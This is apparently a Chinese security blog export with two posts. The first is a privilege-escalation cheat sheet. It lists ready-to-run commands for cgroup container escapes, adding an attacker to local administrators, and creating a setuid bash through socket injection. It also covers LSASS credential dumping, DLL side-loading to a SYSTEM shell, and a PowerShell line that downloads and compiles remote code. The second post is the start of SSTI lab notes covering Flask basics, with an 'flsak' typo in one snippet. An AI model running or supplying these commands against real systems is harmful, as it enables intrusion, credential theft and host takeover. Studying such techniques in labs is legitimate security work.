<h3 id="Abusing-with-FileRestorePrivilege"><a href="#Abusing-with-FileRestorePrivilege" class="headerlink" title="Abusing with FileRestorePrivilege"></a>Abusing with FileRestorePrivilege</h3><p>域：Y&#x2F;N</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  Abuse Privilege</p>
<p>方法： </p>
<ul>
<li><code>poptoke.exe</code></li>
</ul>
<h3 id="Abusing-with-RestoreAndBackupPrivileges"><a href="#Abusing-with-RestoreAndBackupPrivileges" class="headerlink" title="Abusing with RestoreAndBackupPrivileges"></a>Abusing with RestoreAndBackupPrivileges</h3><p>域：Y&#x2F;N</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  Abuse Privilege</p>
<p>方法： </p>
<ul>
<li><code>poptoke.exe</code></li>
</ul>
<h3 id="Abusing-with-ShadowCopyBackupPrivilege"><a href="#Abusing-with-ShadowCopyBackupPrivilege" class="headerlink" title="Abusing with ShadowCopyBackupPrivilege"></a>Abusing with ShadowCopyBackupPrivilege</h3><p>域：Y&#x2F;N</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  Abuse Privilege</p>
<p>方法： </p>
<ul>
<li><code>poptoke.exe</code></li>
</ul>
<h3 id="Abusing-with-ShadowCopy"><a href="#Abusing-with-ShadowCopy" class="headerlink" title="Abusing with ShadowCopy"></a>Abusing with ShadowCopy</h3><p>域：Y&#x2F;N</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  Abuse Privilege</p>
<p>方法： </p>
<ul>
<li><code>poptoke.exe</code></li>
</ul>
<p>批注：我找了很多，感觉最像是的应该是这个工具</p>
<p>链接<a href="https://github.com/hatRiot/token-priv">https://github.com/hatRiot/token-priv</a></p>
<h3 id="Dynamic-Phishing"><a href="#Dynamic-Phishing" class="headerlink" title="Dynamic Phishing"></a>Dynamic Phishing</h3><p>域：Y&#x2F;N</p>
<p>Local Admin: Yes</p>
<p>操作系统： Mac</p>
<p>类型：  Phish</p>
<p>方法： </p>
<ul>
<li><code>https://github.com/thehappydinoa/rootOS</code></li>
<li><code>Python rootOS.py</code></li>
</ul>
<h3 id="Race-Conditions"><a href="#Race-Conditions" class="headerlink" title="Race Conditions"></a>Race Conditions</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  Race Condition</p>
<p>方法： </p>
<ul>
<li><code>echo “net localgroup administrators attacker /add” &gt; C:\temp\not-evil.bat</code></li>
<li><code>tempracer.exe C:\ temp\*.bat</code></li>
</ul>
<h3 id="Abusing-usermode-helper-API"><a href="#Abusing-usermode-helper-API" class="headerlink" title="Abusing usermode helper API"></a>Abusing usermode helper API</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Linux</p>
<p>类型：  Abusing Capabilities</p>
<p>方法： </p>
<pre class="line-numbers language-none"><code class="language-none">d&#x3D;&#96;dirname $(ls -x &#x2F;s*&#x2F;fs&#x2F;c*&#x2F;*&#x2F;r* |head -n1)&#96;
mkdir -p $d&#x2F;w; echo 1 &gt; $d&#x2F;w&#x2F;notify_on_release
t&#x3D;&#96;sed -n ‘s&#x2F;.*\perdir&#x3D;\([^,]*\).*&#x2F;\1&#x2F;p’ &#x2F;etc&#x2F;mtab&#96;
touch &#x2F;o; echo $t&#x2F;c &gt; $d&#x2F;release_agent
echo “#!&#x2F;bin&#x2F;sh” &gt; &#x2F;c
echo “ps &gt; $t&#x2F;o” &gt;&gt; &#x2F;c
chmod +x &#x2F;c
sh -c “echo 0 &gt; $d&#x2F;w&#x2F;cgroup.procs”; sleep 1
cat &#x2F;o<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="Escape-only-with-CAP-SYS-ADMIN-capability"><a href="#Escape-only-with-CAP-SYS-ADMIN-capability" class="headerlink" title="Escape only with CAP_SYS_ADMIN capability"></a>Escape only with CAP_SYS_ADMIN capability</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Linux</p>
<p>类型：  Abusing Capabilities</p>
<p>方法： </p>
<pre class="line-numbers language-none"><code class="language-none">mkdir &#x2F;tmp&#x2F;cgrp &amp;&amp; mount -t cgroup -o rdma cgroup &#x2F;tmp&#x2F;cgrp &amp;&amp; mkdir &#x2F;tmp&#x2F;cgrp&#x2F;x
echo 1 &gt; &#x2F;tmp&#x2F;cgrp&#x2F;x&#x2F;notify_on_release
host_path&#x3D;&#96;sed -n ‘s&#x2F;.*\perdir&#x3D;\([^,]*\).*&#x2F;\1&#x2F;p’ &#x2F;etc&#x2F;mtab&#96;
echo “$host_path&#x2F;cmd” &gt; &#x2F;tmp&#x2F;cgrp&#x2F;release_agent
echo “#!&#x2F;bin&#x2F;sh” &gt; &#x2F;cmd
echo “ps aux &gt; $host_path&#x2F;output” &gt;&gt; &#x2F;cmd
chmod a+x &#x2F;cmd
sh -c “echo \$\$ &gt; &#x2F;tmp&#x2F;cgrp&#x2F;x&#x2F;cgroup.procs”
cat &#x2F;output<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="Abusing-exposed-host-directories"><a href="#Abusing-exposed-host-directories" class="headerlink" title="Abusing exposed host directories"></a>Abusing exposed host directories</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Linux</p>
<p>类型：  Abusing Capabilities</p>
<p>方法： </p>
<ul>
<li><code>mknod /dev/sdb1 block 8 17</code></li>
<li><code>mkdir /mnt/host_home</code></li>
<li><code>mount /dev/sdb1 /mnt/host_home</code></li>
<li><code>echo ‘echo “Hello from container land!” 2&gt;&amp;1’ &gt;&gt; /mnt/host_home/eric_chiang_m/.bashrc</code></li>
</ul>
<h3 id="Unix-Wildcard"><a href="#Unix-Wildcard" class="headerlink" title="Unix Wildcard"></a>Unix Wildcard</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Linux</p>
<p>类型：  Injection</p>
<p>方法： </p>
<ul>
<li><code>python wildpwn.py –file /tmp/very_secret_file combined ./pwn_me/</code></li>
</ul>
<h3 id="Socket-Command-Injection"><a href="#Socket-Command-Injection" class="headerlink" title="Socket Command Injection"></a>Socket Command Injection</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Linux</p>
<p>类型：  Injection</p>
<p>方法： </p>
<ul>
<li><code>echo “cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;” | socat – UNIX-CLIENT:/tmp/socket_test.s</code></li>
</ul>
<h3 id="Logstash"><a href="#Logstash" class="headerlink" title="Logstash"></a>Logstash</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Linux</p>
<p>类型：  Injection</p>
<p>方法： </p>
<ul>
<li><p><code>/etc/logstash/logstash.yml</code></p>
<pre class="line-numbers language-none"><code class="language-none">input &#123;
exec &#123;

           command &#x3D;&gt; “whoami”

           interval &#x3D;&gt; 120

           &#125;

     &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ul>
<h3 id="UsoDllLoader"><a href="#UsoDllLoader" class="headerlink" title="UsoDllLoader"></a>UsoDllLoader</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Linux</p>
<p>类型：  Injection</p>
<p>方法： </p>
<ul>
<li><code>UsoDllLoader.exe</code></li>
</ul>
<p>批注：<a href="https://github.com/itm4n/UsoDllLoader/releases/tag/1.0-20190824">https://github.com/itm4n/UsoDllLoader/releases/tag/1.0-20190824</a></p>
<h3 id="Trend-Chain-Methods-for-Privilege-Escalation"><a href="#Trend-Chain-Methods-for-Privilege-Escalation" class="headerlink" title="Trend Chain Methods for Privilege Escalation"></a>Trend Chain Methods for Privilege Escalation</h3><h3 id="Habanero-Chilli"><a href="#Habanero-Chilli" class="headerlink" title="Habanero Chilli"></a>Habanero Chilli</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  Dll Side-loading</p>
<p>方法： </p>
<ul>
<li><code>rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump</code></li>
</ul>
<h3 id="Padron-Chilli"><a href="#Padron-Chilli" class="headerlink" title="Padron Chilli"></a>Padron Chilli</h3><p>域：Y&#x2F;N</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  Create a Reflective DLL Injector + Reflective DLL for dump lsass memory without touch hard disk</p>
<p>方法： </p>
<ul>
<li><code>#.\inject.x64.exe &lt;Path to reflective dll: .\LsassDumpReflectiveDLL.dll&gt;</code></li>
</ul>
<h3 id="Jalapeno-Chillies"><a href="#Jalapeno-Chillies" class="headerlink" title="Jalapeno Chillies"></a>Jalapeno Chillies</h3><p>域：Yes</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>方法：  unhook NTDLL.dll + dump the lsass.exe as WindowsUpdateProvider.pod</p>
<p>方法： </p>
<ul>
<li><code>NihilistGuy.exe</code></li>
</ul>
<p>批注：<a href="https://github.com/analyticsearch/NihilistGuy">https://github.com/analyticsearch/NihilistGuy</a></p>
<h3 id="Pasilla-Chili"><a href="#Pasilla-Chili" class="headerlink" title="Pasilla Chili"></a>Pasilla Chili</h3><p>域：Yes</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>方法：  SeImpersonatePrivilege + Abusing Service Account Session</p>
<p>方法： </p>
<ul>
<li><code>https://github.com/tyranid/blackhat-usa-2022-demos</code></li>
<li><code>Demo5.ps1</code></li>
</ul>
<h3 id="Finger-Chilli"><a href="#Finger-Chilli" class="headerlink" title="Finger Chilli"></a>Finger Chilli</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  Abusing PrintNotify Service + DLL side-loading</p>
<p>方法： </p>
<ul>
<li><code>以管理员身份，将winspool.drv和mod-ms-win-core-apiquery-l1-1-0.dll复制到C:\Windows\System32\spool\drivers\x64\3\</code></li>
<li><code>将 /bin/ 中包含的所有文件放入同一目录中。</code></li>
<li><code>然后，运行 powershell .\spooltrigger.ps1。</code></li>
<li>享受 NT AUTHORITY\SYSTEM 的 shell。</li>
</ul>
<h3 id="Orange-Cayenne"><a href="#Orange-Cayenne" class="headerlink" title="Orange Cayenne"></a>Orange Cayenne</h3><p>域：Yes</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  Silver Ticket + I Know</p>
<p>方法： </p>
<ul>
<li><code>https://github.com/tyranid/blackhat-usa-2022-demos</code></li>
<li><code>Demo1.ps1</code></li>
</ul>
<h3 id="Red-Cayenne"><a href="#Red-Cayenne" class="headerlink" title="Red Cayenne"></a>Red Cayenne</h3><p>域：Yes</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  Silver ticket + User to User Authentication</p>
<p>方法： </p>
<ul>
<li><code>https://github.com/tyranid/blackhat-usa-2022-demos</code></li>
<li><code>demo2.ps1</code></li>
</ul>
<h3 id="Birds-Eye-Chilli"><a href="#Birds-Eye-Chilli" class="headerlink" title="Birds Eye Chilli"></a>Birds Eye Chilli</h3><p>域：Yes</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  Silver Ticket + Buffer Type Confusion</p>
<p>方法： </p>
<ul>
<li><code>https://github.com/tyranid/blackhat-usa-2022-demos</code></li>
<li><code>Demo3.ps1</code></li>
</ul>
<h3 id="Scotch-Bonnet"><a href="#Scotch-Bonnet" class="headerlink" title="Scotch Bonnet"></a>Scotch Bonnet</h3><p>域：Yes</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  Bring Your Own KDC</p>
<p>方法： </p>
<ul>
<li><code>https://github.com/tyranid/blackhat-usa-2022-demos</code></li>
<li><code>Demo4.ps1</code></li>
</ul>
<h3 id="Lemon-Habanero"><a href="#Lemon-Habanero" class="headerlink" title="Lemon Habanero"></a>Lemon Habanero</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Linux</p>
<p>类型：  Capabilities</p>
<p>方法： </p>
<ul>
<li><code>gcc -Wl,–no-as-needed -lcap-ng -o ambient ambient.c</code></li>
<li><code>sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient</code></li>
<li><code>./ambient /bin/bash</code></li>
</ul>
<p>批注：<a href="https://github.com/bsauce/kernel_exploit_series/tree/master/2-arbitrary_rw">https://github.com/bsauce/kernel_exploit_series/tree/master/2-arbitrary_rw</a></p>
<h3 id="Red-Habanero"><a href="#Red-Habanero" class="headerlink" title="Red Habanero"></a>Red Habanero</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  NtSetInformationProcess + DLL side-loading</p>
<p>方法： </p>
<ul>
<li><code>BypassRtlSetProcessIsCritical.exe pid</code></li>
</ul>
<p>批注：没找到这个东西</p>
<h3 id="Ghost-Pepper"><a href="#Ghost-Pepper" class="headerlink" title="Ghost Pepper"></a>Ghost Pepper</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  <strong>allow low privileged user accounts to create file system and registry symbolic links</strong></p>
<p>方法： </p>
<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">PS</span> C:\> <span class="token variable">$code</span> = <span class="token punctuation">(</span><span class="token function">iwr</span> https:<span class="token operator">/</span><span class="token operator">/</span>raw<span class="token punctuation">.</span>githubusercontent<span class="token punctuation">.</span>com/usdAG/SharpLink/main/SharpLink<span class="token punctuation">.</span>cs<span class="token punctuation">)</span><span class="token punctuation">.</span>content
<span class="token function">PS</span> C:\> <span class="token function">Add-Type</span> <span class="token variable">$code</span>                                                                                          
<span class="token function">PS</span> C:\> <span class="token variable">$s</span> = <span class="token function">New-Object</span> de<span class="token punctuation">.</span>usd<span class="token punctuation">.</span>SharpLink<span class="token punctuation">.</span>Symlink<span class="token punctuation">(</span>“C:\Users\Public\Example\link”<span class="token punctuation">,</span> “C:\ProgramData\target<span class="token punctuation">.</span>txt”<span class="token punctuation">)</span>
<span class="token function">PS</span> C:\> <span class="token variable">$s</span><span class="token punctuation">.</span>Open<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token function">PS</span> C:\> <span class="token function">echo</span> “Hello World :D” > C:\Users\Public\Example\link
<span class="token function">PS</span> C:\> <span class="token function">type</span> C:\ProgramData\target<span class="token punctuation">.</span>txt
Hello World 😀
<span class="token function">PS</span> C:\> <span class="token variable">$s</span><span class="token punctuation">.</span>Close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="Chocolate-Scorpion-Chilli"><a href="#Chocolate-Scorpion-Chilli" class="headerlink" title="Chocolate Scorpion Chilli"></a>Chocolate Scorpion Chilli</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  Directory-Deletion + Windows Media Player d&#x2F;s</p>
<p>方法： </p>
<ul>
<li><code>https://github.com/sailay1996/delete2SYSTEM</code></li>
<li><code>.\poc.ps1</code></li>
</ul>
<h3 id="Carolina-Reaper"><a href="#Carolina-Reaper" class="headerlink" title="Carolina Reaper"></a>Carolina Reaper</h3><p>域：Yes</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  Creates an arbitrary service + PTH</p>
<p>方法： </p>
<ul>
<li><code>https://github.com/tyranid/blackhat-usa-2022-demos</code></li>
<li><code>Demo6.ps1</code></li>
</ul>
<h3 id="The-Intimidator-Chilli"><a href="#The-Intimidator-Chilli" class="headerlink" title="The Intimidator Chilli"></a>The Intimidator Chilli</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  manipulate memory&#x2F;process token values&#x2F;NT system calls and objects&#x2F;NT object manager</p>
<p>方法： </p>
<ul>
<li><code>https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools</code></li>
<li><code>Import-Module NtObjectManager</code></li>
<li><code>Get-ChildItem NtObject:\</code></li>
<li><code>NT*</code></li>
</ul>
<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>摘选自[117种提权方法](<a href="https://mp.weixin.qq.com/mp/wappoc_appmsgcaptcha?poc_token=HO1gV2WjX-cxpRTeHgkYW7opx01zPy6NqCBn2xA7&target_url=https://mp.weixin.qq.com/s/mqJ6rcFeKtCze0F5GN257Q">微信公众平台 (qq.com)</a>)</p>
]]></content>
      <categories>
        <category>知识点</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>SSTI漏洞总结学习</title>
    <url>/2023/11/15/SSTI%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>观看B站教学视频<a href="https://www.bilibili.com/video/BV1tj411u7Bx/?spm_id_from=333.999.0.0">重庆橙子科技</a> 的笔记，个人认为质量很好，记录一下。</p>
<h2 id="靶场部署"><a href="#靶场部署" class="headerlink" title="靶场部署"></a>靶场部署</h2><h3 id="docker地址"><a href="#docker地址" class="headerlink" title="docker地址"></a>docker地址</h3><p>mcc0624&#x2F;flask_ssti:last</p>
<h3 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h3><p>前提是你服务器已经安装了docker，还有提一点，注意云服务器安全组的配置<br>拉取镜像</p>
<blockquote>
<p>docker pull mcc0624&#x2F;flask_ssti:last</p>
</blockquote>
<p><strong>查看镜像</strong><br><img src="https://img-blog.csdnimg.cn/7c2275fe3e05482bbfcb703c1fd5cd66.png" alt="123"><br>此时已经拉取到本地</p>
<blockquote>
<p>指定端口运行容器并且进入命令行<br><code>docker run -p 18022:80 -i -t mcc0624/flask_ssti:last bash -c &#39;/etc/rc.local; /bin/sh&#39;</code></p>
</blockquote>
<p>开启&#x2F;关闭容器</p>
<blockquote>
<p>开启<br>docker run -p 8888:80 -t mcc0624&#x2F;flask_ssti:last<br>关闭<br>docker stop imageid</p>
</blockquote>
<h2 id="Python-venv"><a href="#Python-venv" class="headerlink" title="Python venv"></a>Python venv</h2><p>可以把它想象成一个容器，该容器供你用来存放你的Python脚本以及安装各种Python第三方模块，容器里的环境和本机是完全分开的(就像你在Windows主机上通过Vmware跑一台Ubuntu或者CentOS的虚拟主机一样)，也就是说你在venv下通过pip安装的Python第三方模块是不会存在于你本机的环境下的。</p>
<h3 id="安装venv"><a href="#安装venv" class="headerlink" title="安装venv"></a>安装venv</h3><blockquote>
<p>apt install python3-venv</p>
</blockquote>
<p>创建venv环境安装flask<br>进入&#x2F;opt目录，运行命令：</p>
<blockquote>
<p>python3 -m venv flask1<br>cd fl*<br>l<br>这里包含python虚拟环境的组件<br><img src="https://img-blog.csdnimg.cn/f544a20f541b42eea056ad0d2589e719.png" alt="1"></p>
</blockquote>
<p>此时咱们在&#x2F;opt目录创建一个文件demo.py<br>然后执行文件</p>
<blockquote>
<p>python3 demo.py<br><img src="https://img-blog.csdnimg.cn/7a1cb258217d4db0b691dae1a8d34312.png" alt="123"></p>
</blockquote>
<p>请注意，这里使用的物理主机的python环境执行的，那么我们如何使用虚拟的python环境来执行这个文件呢？</p>
<blockquote>
<p>执行flask1路径下的python<br><img src="https://img-blog.csdnimg.cn/36ecf712be56493d8eef85062c3b2bd8.png" alt="123"></p>
</blockquote>
<p>这时就是用虚拟的python环境执行该文件<br>当然还可以这样</p>
<blockquote>
<p>cd flask1<br>进入虚拟环境<br>source .&#x2F;bin&#x2F;activate<br>退出虚拟环境<br>dactivate</p>
</blockquote>
<h2 id="虚拟环境下安装flask以及应用"><a href="#虚拟环境下安装flask以及应用" class="headerlink" title="虚拟环境下安装flask以及应用"></a>虚拟环境下安装flask以及应用</h2><p><strong>安装</strong></p>
<blockquote>
<p>pip install flask</p>
</blockquote>
<p><strong>应用</strong></p>
<blockquote>
<p>vim demo.py</p>
</blockquote>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flsak <span class="token keyword">import</span> Flask
app<span class="token operator">=</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">"hello benben"</span>

<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这个时候默认端口为5000<br>如果你想要改变端口那就修改文件</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flsak <span class="token keyword">import</span> Flask
app<span class="token operator">=</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">"hello benben"</span>

<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">,</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>如果想要开启debug模式，只需加上<code>debug=True</code></p>
<h3 id="Flask变量规则"><a href="#Flask变量规则" class="headerlink" title="Flask变量规则"></a>Flask变量规则</h3><p>通过向规则参数添加变量部分，可以动态构建URL。此变量部分标记为<variable-name>。它作为关键字参数传递给与规则相关联的函数。</p>
<p>在以下示例中，route()装饰器的规则参数包含附加到URL ‘&#x2F;hello’的<name>。因此，如果在浏览器中输入<a href="http://localhost:5000/hello/w3cschool%E4%BD%9C%E4%B8%BAURL%EF%BC%8C%E5%88%99&#39;w3cschool&#39;%E5%B0%86%E4%BD%9C%E4%B8%BA%E5%8F%82%E6%95%B0%E6%8F%90%E4%BE%9B%E7%BB%99hello()%E5%87%BD%E6%95%B0%E3%80%82">http://localhost:5000/hello/w3cschool作为URL，则&#39;w3cschool&#39;将作为参数提供给hello()函数。</a></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
 
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/hello/&lt;name>'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">hello_name</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>
   <span class="token keyword">return</span> <span class="token string">'Hello %s!'</span> <span class="token operator">%</span> name
 
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
   app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/b34afe36bbf44367b590efa57654ec49.png" alt="123"><br>除了默认字符串变量部分之外，还可以使用以下转换器构建规则：<br><img src="https://img-blog.csdnimg.cn/33c6bdc86942423798ca61af1cc428a2.png" alt="1"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
 
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/blog/&lt;int:postID>'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">show_blog</span><span class="token punctuation">(</span>postID<span class="token punctuation">)</span><span class="token punctuation">:</span>
   <span class="token keyword">return</span> <span class="token string">'Blog Number %d'</span> <span class="token operator">%</span> postID
 
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/rev/&lt;float:revNo>'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">revision</span><span class="token punctuation">(</span>revNo<span class="token punctuation">)</span><span class="token punctuation">:</span>
   <span class="token keyword">return</span> <span class="token string">'Revision Number %f'</span> <span class="token operator">%</span> revNo
 
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
   app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="Flask-HTTP方法"><a href="#Flask-HTTP方法" class="headerlink" title="Flask HTTP方法"></a>Flask HTTP方法</h3><p><img src="https://img-blog.csdnimg.cn/e76311f64df0491b84805ff582c04d5a.png" alt="123"></p>
<h3 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h3><p>GET方法用于从服务器获取数据。它没有请求体，所有参数都包含在URL中。在Flask中，我们可以使用route装饰器来定义GET路由。例如，以下代码演示如何定义一个简单的GET路由：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask

app<span class="token operator">=</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/user/&lt;username>'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">get_user</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">'Hello,%s!'</span><span class="token operator">%</span> username

<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/5e9f57615db7473e9484adf03b5943a3.png" alt="123"></p>
<h3 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h3><p>POST方法用于向服务器提交数据。在Flask中，我们可以通过route装饰器将POST路由关联到视图函数。以下是一个简单的POST路由的示例：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>request

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/user'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">create_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    json_data<span class="token operator">=</span>request<span class="token punctuation">.</span>get_json<span class="token punctuation">(</span><span class="token punctuation">)</span>
    name<span class="token operator">=</span>json_data<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span>
    email<span class="token operator">=</span>json_data<span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span>

    <span class="token keyword">return</span> <span class="token string">'User created successfully'</span>

<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
